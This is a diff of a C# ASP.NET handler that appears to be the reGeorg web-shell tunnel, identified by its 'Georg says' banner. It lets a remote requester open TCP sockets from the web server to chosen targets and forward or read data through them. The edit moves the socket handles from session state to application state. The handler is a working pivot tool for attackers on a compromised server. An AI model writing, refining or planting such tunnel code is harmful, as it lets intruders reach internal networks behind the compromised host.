@@ -43,7 +43,7 @@ public class GenericHandler1 : IHttpHandler, System.Web.SessionState.IRequiresSe
                         Socket sender = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                         sender.Connect(remoteEP);
                         sender.Blocking = false;
-                        context.Session[mark] = sender;
+                        context.Application[mark] = sender;
                         context.Response.AddHeader("X-STATUS", "OK");
                     } catch (Exception ex) {
                         context.Response.AddHeader("X-ERROR", "Failed connecting to target");
@@ -51,13 +51,13 @@ public class GenericHandler1 : IHttpHandler, System.Web.SessionState.IRequiresSe
                     }
                 } else if (cmd == "DISCONNECT") {
                     try {
-                        Socket s = (Socket)context.Session[mark];
+                        Socket s = (Socket)context.Application[mark];
                         s.Close();
                     } catch (Exception ex) {
                     }
-                    context.Session.Remove(mark);
+                    context.Application.Remove(mark);
                 } else if (cmd == "FORWARD") {
-                    Socket s = (Socket)context.Session[mark];
+                    Socket s = (Socket)context.Application[mark];
                     try {
                         int buffLen = context.Request.ContentLength;
                         byte[] buff = new byte[buffLen];
@@ -73,7 +73,7 @@ public class GenericHandler1 : IHttpHandler, System.Web.SessionState.IRequiresSe
                     }
                 } else if (cmd == "READ") {
                     try {
-                        Socket s = (Socket)context.Session[mark];
+                        Socket s = (Socket)context.Application[mark];
                         int c = 0;
                         byte[] readBuff = new byte[513];
                         try {
@@ -93,7 +93,6 @@ public class GenericHandler1 : IHttpHandler, System.Web.SessionState.IRequiresSe
                     }
                 }
             } else {
-                context.Session["l"]=true;
                 context.Response.Write("Georg says, 'All seems fine'");
             }
         } catch (Exception ex) {
